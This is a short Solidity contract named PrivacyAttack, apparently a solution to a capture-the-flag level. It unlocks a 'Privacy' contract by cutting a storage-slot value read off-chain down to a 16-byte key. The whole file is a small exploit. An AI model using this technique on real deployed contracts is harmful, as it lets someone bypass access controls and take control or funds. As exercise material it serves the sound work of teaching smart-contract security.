// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "./Privacy.sol";

contract PrivacyAttack {
    Privacy public target;

    constructor(address _target) {
        target = Privacy(_target);
    }

    function unlock(bytes32 _slotValue) external {
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}
